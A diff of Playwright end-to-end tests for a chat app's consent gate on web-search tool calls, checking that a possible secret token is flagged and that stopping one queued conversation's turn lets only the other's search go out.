+    await page.getByRole("textbox", { name: "Message" }).fill("Look these up.");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate digits: the ask appeared");
+    const found = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
+    check("gate digits: the 32-digit token is flagged", found.includes("possible secret") && found.includes(token32), `${found.length} chars of findings`);
+    check("gate digits: the 20-digit identifier stays quiet", !found.includes(id20), `${found.length} chars of findings`);
+    await browser.close();
+  },
+
+  // Abort-first promotion: A on screen, B queued, A's turn stopped — B must
+  // take the screen and still be answerable, and A's call must never leave.
+  async gateabortpromote() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await stubDoor(page, { search: LISBON });
+    await seedOnce(page, toolSettings("toolsgate-abort"));
+    await page.route("**/v1/chat/completions", async (route) => {
+      const raw = route.request().postData() ?? "{}";
+      let body = {};
+      try {
+        body = JSON.parse(raw);
+      } catch {
+        /* the default round below answers anyway */
+      }
+      const messages = body.messages ?? [];
+      const rounds = messages.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).length;
+      const which = String([...messages].reverse().find((m) => m.role === "user")?.content ?? "").includes("alpha") ? "alpha" : "beta";
+      const frames = [];
+      if (rounds === 0) {
+        frames.push({
+          choices: [
+            {
+              delta: {
+                tool_calls: [
+                  { index: 0, id: `t-${which}`, type: "function", function: { name: "web_search", arguments: JSON.stringify({ query: `query about ${which} topic` }) } },
+                ],
+              },
+            },
+          ],
+        });
+        frames.push({ choices: [{ delta: {}, finish_reason: "tool_calls" }] });
+      } else {
+        const answer = `All done in ${which}.`;
+        for (let at = 0; at < answer.length; at += 9) frames.push({ choices: [{ delta: { content: answer.slice(at, at + 9) } }] });
+        frames.push({ choices: [{ delta: {}, finish_reason: "stop" }] });
+      }
+      const sse = frames.map((frame) => `data: ${JSON.stringify(frame)}\n\n`).join("") + "data: [DONE]\n\n";
+      await route.fulfill({ status: 200, contentType: "text/event-stream", body: sse });
+    });
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await attachGateDoc(page, "notes-a.txt", "Notes for conversation A.");
+    await page.getByRole("textbox", { name: "Message" }).fill("Look something up about alpha please");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate abortpromote: the first ask appeared");
+    await page.getByRole("button", { name: "+ New chat" }).click();
+    await attachGateDoc(page, "notes-b.txt", "Notes for conversation B.");
+    await page.getByRole("textbox", { name: "Message" }).fill("Look something up about beta please");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await page.waitForTimeout(2500);
+    check("gate abortpromote: A is the one shown while it waits", ((await page.locator(".webgate-outgoing").textContent()) ?? "").includes("alpha"), "outgoing on screen");
+    // Stop A from A's own thread: its ask settles as a refusal and B, which
+    // was queued behind it, takes the screen.
+    await openSidebar(page, "about alpha");
+    await page.getByRole("button", { name: "Stop generating" }).click();
+    await page
+      .locator(".webgate-outgoing", { hasText: "beta" })
+      .waitFor({ timeout: 10000 })
+      .catch(() => check("gate abortpromote: B took the screen", false, "never showed"));
+    check("gate abortpromote: nothing is waiting any more", !(((await page.locator(".webgate").textContent()) ?? "").includes("waiting behind")), "ask on screen");
+    await page.getByRole("button", { name: "Send it" }).click();
+    await page
+      .locator(".webgate")
+      .waitFor({ state: "detached", timeout: 10000 })
+      .catch(() => check("gate abortpromote: the ask closed", false, "still on screen"));
+    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
+    check(
+      "gate abortpromote: only B's call left",
+      calls.length === 1 && String(calls[0].args?.query).includes("beta"),
+      String(calls.length),
+    );
+    check("gate abortpromote: A stopped honestly", ((await page.locator(".thread").textContent()) ?? "").includes("Stopped early"), "thread on screen");
+    await openSidebar(page, "about beta");
+    check("gate abortpromote: B's turn finished", ((await page.locator(".thread").textContent()) ?? "").includes("All done in beta."), "thread on screen");
     await browser.close();
   },
 };
+
+/**
+ * A model the shared mock cannot script: this test's own tool calls and
+ * answer, served by fulfilling the chat request from the test. Round by
+ * round it reads the wire — a round is a request carrying the previous
+ * rounds' tool_calls — so it never has to count requests. `bodies`, when
+ * given, collects every request body the page actually sent.
+ */
+async function scriptModel(page, calls, answer, bodies = null) {
+  await page.route("**/v1/chat/completions", async (route) => {
+    const raw = route.request().postData();
+    if (bodies) bodies.push(raw ?? "");
+    let rounds = 0;
+    try {
+      const body = JSON.parse(raw ?? "{}");
+      rounds = (body.messages ?? []).filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).length;
+    } catch {
+      rounds = 0;
+    }
+    const frames = [];
+    if (rounds < calls.length) {
+      const round = calls[rounds];
+      (Array.isArray(round) ? round : [round]).forEach((call, index) => {
+        frames.push({
+          choices: [{ delta: { tool_calls: [{ index, id: call.id, type: "function", function: { name: call.name, arguments: call.arguments } }] } }],
+        });
+      });
+      frames.push({ choices: [{ delta: {}, finish_reason: "tool_calls" }] });
+    } else {
+      for (let at = 0; at < answer.length; at += 9) {
+        frames.push({ choices: [{ delta: { content: answer.slice(at, at + 9) } }] });
+      }
+      frames.push({ choices: [{ delta: {}, finish_reason: "stop" }] });
+    }
+    const sse = frames.map((frame) => `data: ${JSON.stringify(frame)}\n\n`).join("") + "data: [DONE]\n\n";
+    await route.fulfill({ status: 200, contentType: "text/event-stream", body: sse });
+  });
+}
+
+/** Attach one text file the way the composer does; the panel row is the
+    attachment's own confirmation. */
+async function attachGateDoc(page, name, text) {
+  await page.locator('.composer input[type="file"]').setInputFiles([
+    { name, mimeType: "text/plain", buffer: Buffer.from(text) },
+  ]);
+  await page
+    .locator(".panel-row", { hasText: name })
+    .first()
+    .waitFor({ timeout: 8000 })
+    .catch(() => check(`gate: ${name} attached`, false, "no panel row appeared"));
+}
+
+/** Wait for the ask to be on screen. A wait that stands in for an assertion
+    must FAIL as one, never as a raw TimeoutError (round-24 rule). */
+async function gateAsk(page, label) {
+  try {
+    await page.locator(".webgate").waitFor({ timeout: 10000 });
+  } catch {
+    check(label, false, "the ask never appeared");
+  }
+}
+
+// The two servers this suite cannot run without. A missing one does not fail
+// fast on its own: it surfaces as twenty selector timeouts that look exactly
+// like harness rot — b0ae9e6 records the same trap in shots.mjs — so say it
+// once, plainly, before any test burns its thirty seconds. The probe itself
+// lives in ./preflight.mjs, where a wedged-but-reachable server is told
+// apart from an absent one before anything is refused.
+import { complaint, reachable } from "./preflight.mjs";
+for (const [url, howToStart] of [
+  [APP, "npm run dev   (in chat/)"],
+  ["http://127.0.0.1:18081", "node scripts/mock-server.mjs   (in chat/)"],
+]) {
+  const verdict = await reachable(url);
+  const said = complaint(url, howToStart, verdict);
+  if (said) {
+    console.log(said);
+    console.log("Without it, every test that waits for an answer fails as a selector timeout.");
+    process.exit(1);
+  }
+}
 
 const only = process.argv.slice(2);
 const names = only.length ? only : Object.keys(tests);
